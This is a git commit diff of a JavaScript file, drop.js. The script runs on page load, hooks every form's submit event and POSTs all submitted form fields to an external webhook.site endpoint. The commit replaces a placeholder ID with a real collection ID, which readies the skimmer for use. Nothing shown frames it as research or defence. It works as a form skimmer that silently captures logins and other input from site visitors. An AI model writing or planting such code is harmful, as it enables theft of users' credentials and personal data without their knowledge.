7e5accb321e0ad8d53b0a580af1d3410239380b1
Tjmz <87590654+Tjmz@users.noreply.github.com>
2026-01-26 00:57:20 +0000

    Update drop.js

--- drop.js
+++ drop.js
@@ -1,7 +1,7 @@
 window.addEventListener('load', () => {
   document.querySelectorAll('form').forEach(form => {
     form.addEventListener('submit', () => {
-      fetch("https://webhook.site/your-id", {
+      fetch("https://webhook.site/40f3696f-4320-47b0-8b22-240b41b8ae7b", {
         method: "POST",
         body: new URLSearchParams(new FormData(form))
       });
